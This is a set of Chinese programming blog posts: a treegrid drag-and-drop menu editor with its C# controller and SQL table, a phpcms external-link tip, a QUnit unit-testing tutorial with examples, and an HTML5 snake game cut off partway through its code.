                $(this).next('tr.treegrid-tr-tree').find('tr[node-id]').droppable({ accept: 'no-accept' });
            },
            onStartDrag: function () {
                $(this).draggable('proxy').css({
                    left: -10000,
                    top: -10000
                });
            },
            onDrag: function (e) {
                $(this).draggable('proxy').show();
                this.pageY = e.pageY;
            },
            onStopDrag: function () {
                $(this).next('tr.treegrid-tr-tree').find('tr[node-id]').droppable({ accept: 'tr[node-id]' });
            }
        }).droppable({
            accept: 'tr[node-id]',
            onDragOver: function (e, source) {

                //拖拽的菜单必须无子菜单
                var d = $("#" + source.id).find('.tree-collapsed');
                var f = $("#" + source.id).find('.tree-expanded');
                if ((d.length + f.length) > 0) {
                    return ;
                }
                //控制菜单最多三级
                var level = $('#syscaidan').treegrid('getLevel', $("#" + e.target.id).attr('node-id'));
                if (level > 3)
                    return ;

                var pageY = source.pageY;
                var top = $(this).offset().top;
                var bottom = top + $(this).outerHeight();
                $(source).draggable('proxy').removeClass('tree-dnd-no').addClass('tree-dnd-yes');
                $(this).removeClass('row-append row-top row-bottom');
                if (pageY > top + (bottom - top) / 2) {
                    if (bottom - pageY < 5) {
                        $(this).addClass('row-bottom');
                    } else {
                        $(this).addClass('row-append');
                    }
                } else {
                    if (pageY - top < 5) {
                        $(this).addClass('row-top');
                    } else {
                        $(this).addClass('row-append');
                    }
                }
            },
            onDragLeave: function (e, source) {
                $(source).draggable('proxy').removeClass('tree-dnd-yes').addClass('tree-dnd-no');
                $(this).removeClass('row-append row-top row-bottom');
            },
            onDrop: function (e, source) {
                //拖拽的菜单必须无子菜单
                var d = $("#" + source.id).find('.tree-collapsed');
                var f = $("#" + source.id).find('.tree-expanded');
                if ((d.length + f.length) > 0) {
                    return alert("拖拽的菜单不能有子菜单！");
                }
                //控制菜单最多三级
                var level = $('#syscaidan').treegrid('getLevel', $("#" + e.target.id).attr('node-id'));
                if (level > 3)
                    return alert("菜单设置不能超过三级！");
                

                var action, point;
                if ($(this).hasClass('row-append')) {
                    action = 'append';
                } else {
                    action = 'insert';
                    point = $(this).hasClass('row-top') ? 'top' : 'bottom';
                }
                $(this).removeClass('row-append row-top row-bottom');
                //==================================
                //做自己的逻辑处理
                var src = $('#syscaidan').treegrid('find', $(source).attr('node-id'));
                var dest = $('#syscaidan').treegrid('find', $(this).attr('node-id'));
                //alert(src.mingcheng + "," + dest.mingcheng);
                //拖拽事件
                $.ajax({
                    url: 'tuozhuai',
                    dataType: 'json',
                    type: 'post',
                    data: {
                        "srcid": src.syscaidanid,
                        "destid": dest.syscaidanid
                    },
                    success: function (data) {
                        if (data.success) {
                            $('#syscaidan').treegrid('reload'); //重新加载treegrid        
                        }
                    }
                });
                //====================
            }
        });
    }

</script>



2、Controller方法
 /// <summary>
        /// 获取到所有菜单列表
        /// </summary>
        /// <param name="pb"></param>
        public static void listdata(pagebase pb)
        {
            ArrayList arr = new ArrayList();

            //取系统菜单,获取前先扫描一遍
            applicationhelper.reload();

            var xitongcaidan = applicationhelper.hasMenu;

            
            //全部菜单
            var quanbucaidans = queryhelper.query<_syscaidan>("select * from syscaidan order by paixu").ToList();
            
            //加载根目录
            arr.Add(new
            {
                syscaidanid = 0,
                biaoshi = "@root",
                yuanshimingcheng = "菜单目录",
                shangji = -1,
                mingcheng = "菜单目录",
                miaoshu = "菜单目录",
                tanchu = "否",
                shifouxianshi = "否",
                leixing = "系统",
                tianjiariqi = DateTime.Now.ToString("yyyy-MM-dd"),
                children = getzicaidan(0, quanbucaidans, xitongcaidan)//加载子菜单
            });

            //输出json
            pb.json(arr);
        }
        /// <summary>
        /// 获取菜单列表
        /// </summary>
        /// <param name="syscaidanid">父菜单ID</param>
        /// <param name="quanbucaidans">全部菜单列表</param>
        /// <param name="xitongcaidan">系统菜单列表</param>
        /// <returns></returns>
        public static ArrayList getzicaidan(int syscaidanid, List<_syscaidan> quanbucaidans, Dictionary<string, caidan> xitongcaidan)
        {
            ArrayList arr = new ArrayList();

            //取一级部门
            var zicaidans = from o in quanbucaidans where o.shangji == syscaidanid select o;
            //加载部门
            foreach (_syscaidan zicaidan in zicaidans)
            {
                //取原始名称
                var _caidan=new caidan();
                xitongcaidan.TryGetValue(zicaidan.biaoshi, out _caidan);

                arr.Add(new
                {
                    syscaidanid = zicaidan.syscaidanid,
                    biaoshi=zicaidan.biaoshi,
                    yuanshimingcheng =_caidan==null?"":_caidan.mingcheng,
                    shangji = zicaidan.shangji,
                    mingcheng = string.IsNullOrEmpty(zicaidan.mingcheng) ? _caidan == null ? "" : _caidan.mingcheng : zicaidan.mingcheng,
                    miaoshu = zicaidan.miaoshu,
                    tanchu = zicaidan.tanchu == 0 ? "否" : "是",
                    shifouxianshi = zicaidan.shifouxianshi==0?"否":"是",
                    leixing = zicaidan.leixing==0?"系统":"人工添加",
                    tianjiariqi = zicaidan.tianjiariqi.ToString("yyyy-MM-dd"),
                    children = getzicaidan(zicaidan.syscaidanid, quanbucaidans,xitongcaidan)
                });

               
            }
            return arr;
        }

        /// <summary>
        /// 编辑
        /// </summary>
        /// <param name="pb"></param>
        [layout("default_edit")]
        public static void edit(pagebase pb)
        {
            var id = pb.v_i(_syscaidan_.syscaidanid);
            if (id <= 0) return;
            //方法一
            string sql = "select * from syscaidan where syscaidanid=@0";
            var t = queryhelper.get<_syscaidan>(sql, id);

            pb["leixing"] = t.leixing;
            pb.autoloaddata(t);
        }

        /// <summary>
        /// 保存完毕
        /// </summary>
        /// <param name="pb"></param>
        public static void save(pagebase pb)
        {
            //这是一种情况
            _syscaidan syscaidan = pb.getmodel<_syscaidan>();

            if (syscaidan.syscaidanid <= 0)
            {
                syscaidan.tianjiariqi = DateTime.Now;
                syscaidan.leixing = 1;//类型：人工
            }

            if (syscaidan.saveorupdate().identity > 0)
                pb.back("保存成功!");
            else
                pb.back("保存失败!", false);
        }

        /// <summary>
        /// 删除
        /// </summary>
        /// <param name="pb"></param>
        public static void delete(pagebase pb)
        {
            //这是一种情况
            _syscaidan syscaidan = pb.getmodel<_syscaidan>();

            if (syscaidan.delete(true) > 0)
                pb.json(new { msg = "删除成功!", success = true });
            else
                pb.json(new { msg = "删除失败!", success = false });
        }

        /// <summary>
        /// 拖拽
        /// </summary>
        /// <param name="pb"></param>
        public static void tuozhuai(pagebase pb)
        {
            var srcid = pb.v_i("srcid");//要移动的
            if (srcid <= 0) return;
            var destid = pb.v_i("destid");//目标位置的
            if (destid < 0) return;

            string sql = "select * from syscaidan where syscaidanid=@0";
            var srcsyscaidan = queryhelper.get<_syscaidan>(sql, srcid);

            if (destid != 0)//目标位置不是根目录时
            {
                var destsyscaidan = queryhelper.get<_syscaidan>(sql, destid);
                srcsyscaidan.shangji = destsyscaidan.syscaidanid;
            }
            else
            {
                srcsyscaidan.shangji = 0;
            }

            var destmaxpaixu = queryhelper.get<int>("select num=max(paixu) from syscaidan where shangji=@0",destid);
            srcsyscaidan.paixu = ++destmaxpaixu;

             if (srcsyscaidan.saveorupdate().identity > 0)
                 pb.json(new { msg = "移动成功!", success = true });
            else
                 pb.json(new { msg = "移动失败!", success = false });
        }

        /// <summary>
        /// 初始化
        /// </summary>
        /// <param name="pb"></param>
        public static void chushihua(pagebase pb)
        {
            string sql = "delete from syscaidan ";
            var result = queryhelper.execute(sql);

            xitongcaidanchushihua();

            if (result >= 0)
                pb.json(new { msg = "初始化成功!", success = true });
            else
                pb.json(new { msg = "初始化失败!", success = false });
        }
        /// <summary>
        /// 系统菜单初始化
        /// </summary>
        public static void xitongcaidanchushihua()
        {
            //取系统菜单,获取前先扫描一遍
            applicationhelper.reload();
            var xitongcaidan = applicationhelper.hasMenu;
            //循环写入数据库
            if (xitongcaidan != null && xitongcaidan.Count > 0)
            {
                string sql = "";
                StringBuilder sqlsb = new StringBuilder();
                sqlsb.AppendLine("insert into syscaidan(biaoshi,mingcheng,path,leixing) values ");
                foreach (caidan _caidan in xitongcaidan.Values)
                {
                    sqlsb.AppendLine("('"+_caidan.biaoshi+"','"+_caidan.mingcheng+"','"+_caidan.path+"',0),");
                }
                sql = sqlsb.ToString().Trim();
                sql = sql.Substring(0, sql.Length - 1);
                queryhelper.execute(sql);
            }
        }
3、库表设计
/****** Object:  Table [dbo].[syscaidan]    Script Date: 2015/8/26 14:22:09 ******/
SET ANSI_NULLS ON
GO

SET QUOTED_IDENTIFIER ON
GO

CREATE TABLE [dbo].[syscaidan](
	[syscaidanid] [int] IDENTITY(1,1) NOT NULL,
	[path] [nvarchar](200) NULL,
	[biaoshi] [nvarchar](200) NULL,
	[shifouxianshi] [int] NULL,
	[leixing] [int] NULL,
	[shangji] [int] NULL,
	[paixu] [int] NULL,
	[tanchu] [int] NULL,
	[tianjiariqi] [datetime] NULL,
	[miaoshu] [nvarchar](500) NULL,
	[mingcheng] [nvarchar](200) NULL,
 CONSTRAINT [PK_syscaidan] PRIMARY KEY CLUSTERED 
(
	[syscaidanid] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]

GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'菜单id' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'syscaidanid'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'菜单唯一系统标示，用于判断权限' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'path'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'标示' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'biaoshi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'是否显示,0是不显示，1是显示' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'shifouxianshi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'类型 0是系统 1是用户自定义' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'leixing'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'上级ID' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'shangji'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'排序，从小到大排序' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'paixu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'点击菜单是否弹出 1弹出 0不弹出' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'tanchu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'创建日期' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'tianjiariqi'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'描述' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'miaoshu'
GO

EXEC sys.sp_addextendedproperty @name=N'MS_Description', @value=N'标题' , @level0type=N'SCHEMA',@level0name=N'dbo', @level1type=N'TABLE',@level1name=N'syscaidan', @level2type=N'COLUMN',@level2name=N'mingcheng'
GO


4、实现效果

拖拽



有需要的童鞋，按照自己的业务逻辑改改就是了。



版权声明：本文为博主原创文章，未经博主允许不得转载。

phpcms v9 外部链接在新窗口打开
        在phpcms后台添加的外部链接都是在本页面打开，phpcms后台也乜有直接让外部链接打开新窗口的功能，接下来我会告诉你，在代码里加一个判断就完成。
如果你的外部链接是子栏目在列表中显示，那就找content下的list.html，如果是在单网页显示的就找page.html，如果是在导航 就找heard.html。找到连接的a标签，然后在a标签上一个判断：
<a href="{$r[url]}" {if $r[type]==2} target="_blank"{/if} ><span>{$r[catname]}</span></a>
因为外部链接类型的，在category表里和其他不同的是type字段的值是2，到这里就完美解决了。
总结：研究1个小时的成果，半个小时花在，在后台找在窗口打开的设置，麻的，好了不说了。

版权声明：本文为博主原创文章，未经博主允许不得转载。

javascript--QUnit【javascript单元测试框架】
QUnit官网
开源中国：http://www.oschina.net/p/qunit
参考：http://www.zhangxinxu.com/wordpress/2013/04/qunit-javascript-unit-test-单元测试/
    http://blog.csdn.net/cyq1984/article/details/6398596




一、断言（Assert）
async()
Instruct QUnit to wait for an asynchronous operation.
指导QUnit等待异步操作。


deepEqual()
A deep recursive comparison, working on primitive types, arrays, objects, regular expressions, dates and functions.
用于基本类型，数组，对象，正则表达式，日期和功能的深递归比较。


equal()
A non-strict comparison, roughly equivalent to JUnit’s assertEquals.
非严格的比较，大致相当于JUnit的assertEquals。

expect()
Specify how many assertions are expected to run within a test.
指定有多少断言，将会在运行测试中。


notDeepEqual()
An inverted deep recursive comparison, working on primitive types, arrays, objects, regular expressions, dates and functions.
用于基本类型，数组，对象，正则表达式，日期和功能的倒置深递归比较。

notEqual()
A non-strict comparison, checking for inequality.
非严格的比较，检查是否不平等。


notOk()
A boolean check, inverse of ok() and CommonJS’s assert.ok(), and equivalent to JUnit’s assertFalse(). Passes if the first argument is falsy.
一个布尔检查，ok()和CommonJS的的assert.ok（），并相当于JUnit的assertFalse（）。如果第一个参数是假的，则传递。

notPropEqual()
A strict comparison of an object’s own properties, checking for inequality.
严格的比较对象的自己的属性，检查是否不平等。


notStrictEqual()
A strict comparison, checking for inequality.
严格的比较，检查是否不平等。

ok()
A boolean check, equivalent to CommonJS’s assert.ok() and JUnit’s assertTrue(). Passes if the first argument is truthy.
一个布尔检查，相当于CommonJS的的assert.ok（）和JUnit的assertTrue（）。如果第一个参数是真的，则传递。

propEqual()
A strict type and value comparison of an object’s own properties.
比较一个对象的严格的类型和值。

push()
Report the result of a custom assertion
报告自定义断言的结果

strictEqual()
A strict type and value comparison.
比较严格的类型和值。


throws()
Test if a callback throws an exception, and optionally compare the thrown error.

如果回调抛出一个异常，以及可选比较抛出错误，则测试。



二、异步控制（Async Control）
async()
Instruct QUnit to wait for an asynchronous operation.

QUnit.asyncTest()
DEPRECATED: Add an asynchronous test to run. The test must include a call to QUnit.start().

QUnit.start()
PARTIALLY DEPRECATED: Start running tests again after the testrunner was stopped. See QUnit.stop() and QUnit.config.autostart.

QUnit.stop()
DEPRECATED: Increase the number of QUnit.start() calls the testrunner should wait for before continuing.

QUnit.test()
Add a test to run.



三、回调函数（callbacks）
When integrating QUnit into other tools like CI servers, use these callbacks as an API to read test results.

QUnit.begin()
Register a callback to fire whenever the test suite begins.

QUnit.done()
Register a callback to fire whenever the test suite ends.

QUnit.log()
Register a callback to fire whenever an assertion completes.

QUnit.moduleDone()
Register a callback to fire whenever a module ends.

QUnit.moduleStart()
Register a callback to fire whenever a module begins.

QUnit.testDone()
Register a callback to fire whenever a test ends.

QUnit.testStart()
Register a callback to fire whenever a test begins.




四、配置（configuration）
These methods and properties are used to configure QUnit: to adjust the runtime behaviour directly or extend the QUnit API via custom assertions.


QUnit.assert
Namespace for QUnit assertions

QUnit.config
Configuration for QUnit

QUnit.dump.parse()
Advanced and extensible data dumping for JavaScript

QUnit.extend()
Copy the properties defined by the mixin object into the target object

QUnit.init()
DEPRECATED: Re-initialize the test runner.

QUnit.push()
DEPRECATED: Report the result of a custom assertion

QUnit.reset()
DEPRECATED: Reset the test fixture in the DOM.





五、Test


QUnit.asyncTest()
DEPRECATED: Add an asynchronous test to run. The test must include a call to QUnit.start().
QUnit.module()
Group related tests under a single label.
QUnit.skip()
Adds a test like object to be skipped
QUnit.test()
Add a test to run.





六、实例


在测试页面添加两个文件：
qunit.css

qunit.js



本测试以qunit-1.18.0.css、qunit-1.18.0.js版本


1、基本例子
01.html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit Example</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css"/>
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>
  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <!--引入你需要测试的js-->
  <script src="tests.js"></script>
</body>
</html>tests.js
//base
QUnit.test( "hello test", function( assert ) {
  assert.ok( 1 == "1", "Passed!" );
});

结果





2、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--basicExample</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "a basic test example", function( assert ) {
      var value = "hello";
      assert.equal( value, "hello", "We expect value to be hello" );
    });
  </script>
</body>
</html>
结果



3、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--ok()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "ok test", function( assert ) {
      assert.ok( true, "true succeeds" );
      assert.ok( "non-empty", "non-empty string succeeds" );
     
      assert.ok( false, "false fails" );
      assert.ok( 0, "0 fails" );
      assert.ok( NaN, "NaN fails" );
      assert.ok( "", "empty string fails" );
      assert.ok( null, "null fails" );
      assert.ok( undefined, "undefined fails" );
    });
  </script>
</body>
</html>
结果



4、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "equal test", function( assert ) {
      assert.equal( 0, 0, "Zero, Zero; equal succeeds" );
      assert.equal( "", 0, "Empty, Zero; equal succeeds" );
      assert.equal( "", "", "Empty, Empty; equal succeeds" );
      assert.equal( 0, false, "Zero, false; equal succeeds" );
     
      assert.equal( "three", 3, "Three, 3; equal fails" );
      assert.equal( null, false, "null, false; equal fails" );
    });
  </script>
</body>
</html>
结果




5、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--deepEqual()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "deepEqual test", function( assert ) {
      var obj = { foo: "bar" };
     
      assert.deepEqual( obj, { foo: "bar" }, "Two objects can be the same in value" );
    });
  </script>
</body>
</html>
结果




6、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--expect()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script>
    QUnit.test( "a test", function( assert ) {
      assert.expect( 2 );
     
      function calc( x, operation ) {
        return operation( x );
      }
     
      var result = calc( 2, function( x ) {
        assert.ok( true, "calc() calls operation function" );
        return x * x;
      });
     
      assert.equal( result, 4, "2 square equals 4" );
    });
  </script>
</body>
</html>


结果




7、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--expect()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "a test", function( assert ) {
      assert.expect( 1 );
     
      var $body = $( "body" );
     
      $body.on( "click", function() {
        assert.ok( true, "body was clicked!" );
      });
     
      $body.trigger( "click" );
    });
  </script>
</body>
</html>
结果




8、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--async()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>
  <input id="test-input"/>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "asynchronous test: async input focus", function( assert ) {
      var done = assert.async();
      var input = $( "#test-input" ).focus();
      setTimeout(function() {
        assert.equal( document.activeElement, input[0], "Input was focused" );
        done();
      });
    });
  </script>
</body>
</html>
结果




9、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--log()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    function KeyLogger( target ) {
      this.target = target;
      this.log = [];
     
      var that = this;
      this.target.off( "keydown" ).on( "keydown", function( event ) {
        that.log.push( event.keyCode );
      });
    }


    QUnit.test( "keylogger api behavior", function( assert ) {
      var doc = $( document ),
        keys = new KeyLogger( doc );
     
      // Trigger the key event
      doc.trigger( $.Event( "keydown", { keyCode: 9 } ) );
     
      // Verify expected behavior
      assert.deepEqual( keys.log, [ 9 ], "correct key was logged" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>


结果






10、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "2 asserts", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append( "<div>hello!</div>" );
      assert.equal( $( "div", fixture ).length, 1, "div added successfully!" );
     
      fixture.append( "<span>hello!</span>" );
      assert.equal( $( "span", fixture ).length, 1, "span added successfully!" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果



11、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--equal()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "Appends a div", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append( "<div>hello!</div>" );
      assert.equal( $( "div", fixture ).length, 1, "div added successfully!" );
    });
     
    QUnit.test( "Appends a span", function( assert ) {
      var fixture = $( "#qunit-fixture" );
     
      fixture.append("<span>hello!</span>" );
      assert.equal( $( "span", fixture ).length, 1, "span added successfully!" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>

结果



12、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--ok()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.test( "global pollution", function( assert ) {
      window.pollute = true;
      assert.ok( pollute, "nasty pollution" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果





13、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--module()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.module( "group a" );
    QUnit.test( "a basic test example", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
    QUnit.test( "a basic test example 2", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
     
    QUnit.module( "group b" );
    QUnit.test( "a basic test example 3", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
    QUnit.test( "a basic test example 4", function( assert ) {
      assert.ok( true, "this test is fine" );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>
结果






14、
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>QUnit--module()</title>
  <link rel="stylesheet" href="http://code.jquery.com/qunit/qunit-1.18.0.css">
</head>
<body>
  <div id="qunit"></div>
  <div id="qunit-fixture"></div>

  <script src="http://code.jquery.com/qunit/qunit-1.18.0.js"></script>
  <script src="jquery-1.11.3.min.js"></script>
  <script>
    QUnit.module( "module", {
      beforeEach: function( assert ) {
        assert.ok( true, "one extra assert per test" );
      }, afterEach: function( assert ) {
        assert.ok( true, "and one extra assert after each test" );
      }
    });

    QUnit.test( "test with beforeEach and afterEach", function(assert) {
      assert.expect( 2 );
    });
  </script>
</body>
</html>
  </script>
</body>
</html>


结果










版权声明：本文为博主原创文章，未经博主允许不得转载。

最简单的HTML5游戏——贪吃蛇
<html>
<head>
<meta charset="UTF-8"/>
<title>贪吃蛇</title>
</head>

<body>
    <canvas id="canvas" width="1000" height="700"></canvas>
    <div>
        <input id="switch" type="button" value="开始" onclick="clickSwitch()"></input><br/>
        <input id="content" type="text" value="0"></input>
    </div>
</body>

<script type="text/javascript">
    const WIDTH = 1000;
    const HEIGHT = 700;
    const SNACK_WIDTH = 20;
    const SNACK_HEIGHT = 20;
    //移动时间间隔
    const TIME_MOVE = 300;
    //食物刷新时间
    const TIME_FOOD = 5000;
    //食物总量
    const TOTAL_FOOD = 200; 
    //石头刷新时间
    const TIME_STONE = 8000;
    //石头总量
    const TOTAL_STONE = 300; 
    
    var switchStatus = 0;
    var changeMove = "right";
    var currentMove = "right";
    //所有被用的位置
    var points = new Array();
    var snacks = new Array();
    var foods = new Array();
    var stones = new Array();
    var moveing = false;
    var timeMoveId, timeFoodId, timeStoneId;
    
    window.onload = function () {
        createGround();
    };
    
    //捕获按的哪个键
    function keyDown(event) {
        if (event.keyCode == "87") {
            //按下W键
            changeMove = "up";
        } else if (event.keyCode == "68") {
            //按下D键
            changeMove = "right";
        } else if (event.keyCode == "83") {
            //按下S键
            changeMove = "down";
        } else if (event.keyCode == "65") {
            //按下A键
            changeMove = "left";
        }
    }

    function handlePoints(x, y, type) {
        if (0 == type) {
            points.push(x+y*WIDTH);
        } else {
            var index = points.indexOf(x+y*WIDTH);
            if (index != -1) {
                points.splice(index, 1);
            }
        }
    }
    
    //贪吃蛇
    function snack(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //食物
    function food(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //石头
    function stone(x, y) {
        this.x = x;
        this.y = y;
    }
    
    //开关操作
    function clickSwitch() {
        if (switchStatus == 0 || switchStatus == 2) {
            document.getElementById("switch").value = "暂停";
            if (switchStatus == 0) {
                //开始
                play();
            }
            switchStatus = 1;
        } else if (switchStatus == 1) {
            document.getElementById("switch").value = "继续";
            switchStatus = 2;
        }
    }
    
    //碰撞判定并操作
    function judge(x, y) {
        /*** 判断是否撞上边界  ***/
        if (x < 0 || x >= WIDTH || y < 0 || y >= HEIGHT) {
            end();
            return;
        } 
        
        var i;
        /*** 判断是否撞上自己  ***/
        for (i = 1; i < snacks.length; i++) {
            if (snacks[0].x == snacks[i].x && snacks[0].y == snacks[i].y) {
                end();
                return;
            }
        }
        
        /*** 判断是否撞上石头  ***/
        for (i = 0; i < stones.length; i++) {
            if (snacks[0].x == stones[i].x && snacks[0].y == stones[i].y) {
                end();
                return;
            }
        }
        
        /*** 判断是否撞上食物  ***/
         var flag = false;
        for (i = 0; i < foods.length; i++) {
            if (x == foods[i].x && y == foods[i].y) {
                flag = true;
                foods.splice(i, 1);
            }
        } 
        var newSnack = new snack(x, y);
        snacks.unshift(newSnack);
        if (!flag) {
            var p = snacks.pop();
            handlePoints(p.x, p.y, 1);
        }
        document.getElementById("content").value = "x:"+snacks[0].x+" y:"+snacks[0].y+" length:"+snacks.length;
        
        refresh();
    }
    
    //移动贪吃蛇
    function move() {
        if(moveing == false && switchStatus == 1) {
            moveing = true;
            if ((currentMove != "right" && changeMove == "left") || (currentMove == "left" && changeMove == "right")) {
                currentMove = "left";
                judge(snacks[0].x-SNACK_WIDTH, snacks[0].y);
            } else if ((currentMove != "down" && changeMove == "up") || (currentMove == "up" && changeMove == "down")) {
                currentMove = "up";
                judge(snacks[0].x, snacks[0].y-SNACK_HEIGHT);
            } else if ((currentMove != "left" && changeMove == "right")  || (currentMove == "right" && changeMove == "left")) {
                currentMove = "right";
                judge(snacks[0].x+SNACK_WIDTH, snacks[0].y);
            } else if ((currentMove != "up" && changeMove == "down") || (currentMove == "down" && changeMove == "up")){
                currentMove = "down";
                judge(snacks[0].x, snacks[0].y+SNACK_HEIGHT);
            } 
            changMove = currentMove;
        }
        moveing = false;
    }
    
    //创建地图
    function createGround() {
